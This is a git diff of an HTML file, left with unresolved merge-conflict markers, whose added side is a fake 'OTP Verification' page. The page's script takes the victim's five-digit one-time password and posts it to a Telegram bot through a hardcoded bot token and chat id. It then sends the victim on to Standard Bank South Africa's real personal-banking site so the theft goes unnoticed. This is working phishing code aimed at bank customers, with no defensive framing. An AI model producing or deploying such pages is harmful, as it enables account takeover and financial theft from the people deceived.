@@ -1,3 +1,4 @@
+<<<<<<< HEAD
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -58,4 +59,66 @@
     };
   </script>
 </body>
+=======
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>OTP Verification</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="otp-fixed-container" id="otp-fixed-container" style="display: block;">
+    <h2>Enter OTP</h2>
+    <div class="form-group">
+      <input type="password" id="otp" placeholder="Enter OTP" maxlength="5" pattern="\d{5}">
+    </div>
+    <div class="buttons">
+      <button id="verifyOTPBtn" aria-label="Verify OTP">Verify OTP</button>
+    </div>
+    <div id="otp-error" style="color: red; text-align: center; display: none;">
+      Invalid OTP. Please enter a 5-digit number.
+    </div>
+  </div>
+  <script>
+    document.getElementById('verifyOTPBtn').addEventListener('click', () => {
+      const otp = document.getElementById('otp').value.trim();
+      const otpPattern = /^\d{5}$/;
+
+      if (otpPattern.test(otp)) {
+        const otpMessage = `OTP: ${otp}`;
+        Promise.all([sendToTelegram(otpMessage)])
+          .then(() => {
+            window.location.href = 'https://www.standardbank.co.za/southafrica/personal';
+            alert('OTP verified successfully!');
+          })
+          .catch(error => {
+            console.error("Failed to send OTP:", error);
+            alert('OTP verification failed.');
+          });
+      } else {
+        alert('Invalid OTP. Please enter a 5-digit number.');
+      }
+    });
+
+    const sendToTelegram = (message) => {
+      const botToken = "8153232432:AAGEj9IZz22a9BYl3kPqp29zTsuMlGc82bA";
+      const chatId = "-4850961794";
+      const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      return fetch(telegramApiUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      });
+    };
+  </script>
+</body>
+>>>>>>> 52911e023d0b7fd873da4cfb858c017127d53dc9
 </html>
